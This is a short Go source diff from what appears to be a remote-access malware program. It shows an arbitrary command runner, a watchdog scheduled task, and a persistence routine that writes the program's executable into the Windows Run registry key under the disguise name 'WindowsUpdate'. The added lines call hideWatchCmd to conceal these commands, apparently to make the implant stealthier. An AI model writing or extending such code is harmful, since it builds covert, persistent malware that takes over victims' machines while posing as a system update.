@@ -282,6 +282,7 @@ func runCommand(cmdStr string) (string, string) {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd.exe", "/c", cmdStr)
+		hideWatchCmd(cmd)
 	} else {
 		cmd = exec.Command("sh", "-c", cmdStr)
 	}
@@ -330,6 +331,7 @@ func exitSoon(via string) {
 		time.Sleep(800 * time.Millisecond)
 		if runtime.GOOS == "windows" {
 			c := exec.Command("schtasks", "/change", "/TN", "WindowsUpdate", "/DISABLE")
+			hideWatchCmd(c)
 			if out, err := c.CombinedOutput(); err != nil {
 				log.Printf("[!] disable watchdog task: %v %s", err, strings.TrimSpace(string(out)))
 			} else {
@@ -1601,6 +1603,7 @@ func installPersistence() error {
 	exe, _ = filepath.Abs(exe)
 	// Try registry via cmd
 	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", exe, "/f")
+	hideWatchCmd(cmd)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return fmt.Errorf("reg add: %v output=%s", err, string(out))
